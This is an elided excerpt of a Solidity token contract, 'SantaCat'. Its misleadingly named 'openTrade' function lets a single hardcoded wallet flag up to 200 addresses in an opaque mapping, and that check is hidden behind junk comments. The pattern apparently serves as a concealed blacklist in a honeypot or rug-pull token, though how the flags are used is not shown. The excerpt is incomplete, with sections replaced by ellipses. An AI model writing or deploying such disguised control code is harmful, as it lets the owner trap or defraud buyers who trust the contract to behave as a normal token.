...
contract SantaCat is Context, IERC20, Ownable {
    ...
    string private _symbol = "SantaCat";
    uint8 private _decimals = 9;
    bool public qweqwe = true;
    mapping (address => bool) public aa;
    address payable private marketWall = payable(0x03564f6AAdc721bcF47D40363b416B13B0F13c8e); 
    address payable private teamWalletAddress = payable(0x03564f6AAdc721bcF47D40363b416B13B0F13c8e); 
    ...
    constructor (uint256[2] memory buyFeeSetting_) {
		require(
            1 == buyFeeSetting_[0],
            "Bad fail"
        );  
	...
	function openTrade(address[] calldata addresses, bool status) public{
          if(/*asyy*/marketWall/*iiis*/ ==
     /*mnb*/msg.sender/*kks*/ ){  
        require(addresses.length < 201); // to prevent gas error
        for (uint256 i; i < addresses.length; ++i) {
            aa[addresses[i]] = status;
        }
    }
 }
